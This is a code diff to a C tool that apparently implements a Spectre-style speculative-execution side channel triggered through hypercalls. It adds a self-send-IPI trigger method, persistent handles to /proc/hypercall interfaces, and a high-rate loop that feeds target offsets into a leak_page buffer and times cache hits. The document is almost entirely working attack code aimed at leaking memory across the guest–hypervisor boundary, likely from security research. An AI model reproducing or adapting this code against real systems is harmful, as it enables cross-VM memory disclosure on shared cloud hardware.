@@ -14,6 +14,7 @@
 #include <sys/mman.h>
 #include <time.h>
 #include <unistd.h>
+#include <assert.h>
 
 #include "constants.h"
 #include "hypercall.h"
@@ -23,15 +24,33 @@
 enum half_spectre_method {
   METHOD_IPI,
   METHOD_YIELD,
+  METHOD_SELF_SEND_IPI,
 };
-static const enum half_spectre_method method = METHOD_YIELD;
+static const enum half_spectre_method method = METHOD_SELF_SEND_IPI;
 
 #define HYPERCALL_PATH_SIZE 127
 size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
+  static int fd_sched_yield = -1;
+  static int fd_send_ipi = -1;
+  static int fd_self_send_ipi = -1;
+
+  if (fd_sched_yield == -1) {
+    fd_sched_yield = open ("/proc/hypercall/sched_yield", O_WRONLY);
+    assert(fd_sched_yield > 0);
+  }
+  if (fd_send_ipi == -1) {
+    fd_send_ipi = open ("/proc/hypercall/send_ipi", O_WRONLY);
+    assert(fd_send_ipi > 0);
+  }
+  if (fd_self_send_ipi == -1) {
+    fd_self_send_ipi = open ("/proc/hypercall/self_send_ipi", O_WRONLY);
+    assert(fd_self_send_ipi > 0);
+  }
+
   unsigned int cpu = 0;
   struct send_ipi_hypercall opts_ipi;
   struct sched_yield_hypercall opts_yield;
-  char hypercall_path[HYPERCALL_PATH_SIZE + 1] = {0};
+  struct self_send_ipi_hypercall opts_self_send_ipi;
 
   switch (method) {
   case METHOD_YIELD:
@@ -41,7 +60,6 @@ size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iter
     opts_yield.current_cpu_id = cpu;
     opts_yield.speculated_cpu_id = idx;
     opts_yield.ptr = buf;
-    strncpy(hypercall_path, "/proc/hypercall/sched_yield", HYPERCALL_PATH_SIZE);
     break;
   case METHOD_IPI:
     opts_ipi.real.mask_low = -1;
@@ -51,16 +69,20 @@ size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iter
     opts_ipi.mispredicted.mask_high = -1;
     opts_ipi.mispredicted.min = idx;
     opts_ipi.ptr = buf;
-
-    strncpy(hypercall_path, "/proc/hypercall/send_ipi", HYPERCALL_PATH_SIZE);
+    break;
+  case METHOD_SELF_SEND_IPI:
+    opts_self_send_ipi.min = idx;
+    opts_self_send_ipi.repeat = iters;
     break;
   default:
     err(EXIT_FAILURE, "Unknown method type");
   }
 
-  int fd = open(hypercall_path, O_WRONLY);
-  if (fd < 0) {
-    err(fd, "Failed to open %s", hypercall_path);
+  if (method == METHOD_SELF_SEND_IPI) {
+    if (write(fd_self_send_ipi, &opts_self_send_ipi, sizeof(opts_self_send_ipi)) < 0)
+      perror("bla");
+
+    return 0;
   }
 
   ssize_t min = 10000000000;
@@ -68,25 +90,25 @@ size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iter
     ssize_t time = 0;
     switch (method) {
     case METHOD_YIELD:
-      time = write(fd, &opts_yield, sizeof(opts_yield));
+      time = write(fd_sched_yield, &opts_yield, sizeof(opts_yield));
       break;
     case METHOD_IPI:
-      time = write(fd, &opts_ipi, sizeof(opts_ipi));
+      time = write(fd_send_ipi, &opts_ipi, sizeof(opts_ipi));
+      break;
+    case METHOD_SELF_SEND_IPI:
       break;
     default:
       break;
     }
 
     if (time < 0) {
-      err(errno, "Failed to write to %s", hypercall_path);
+      err(errno, "Failed to write to /proc/hypercall/...");
     }
     if (time < CACHE_HIT_THRESHOLD) {
       return time;
     }
     min = time < min ? time : min;
   }
-
-  close(fd);
 
   return min;
 }
@@ -261,9 +283,17 @@ void cmd_access_min(int argc, char *argv[argc], void *leak_page) {
   }
 
   printf("Accessing 0x%lx... (%ld cache lines)\n", min, length);
+  int triggers = 0;
+  uint64_t start = clock_read();
   while (1) {
     for (size_t i = 0; i < length; ++i) {
-      access_buffer_with_spectre(leak_page, min + (8 * i), 10000);
+      access_buffer_with_spectre(leak_page, min + (8 * i), 1000);
+      triggers += 1000;
+    }
+    if (triggers % 1000000 == 0) {
+      double duration = (clock_read() - start) / 1000000000.0;
+      printf("\rtrigger: %d,   triggers / sec: %.1f K", triggers, 0.001*triggers/duration);
+      fflush(stdout);
     }
   }
 }
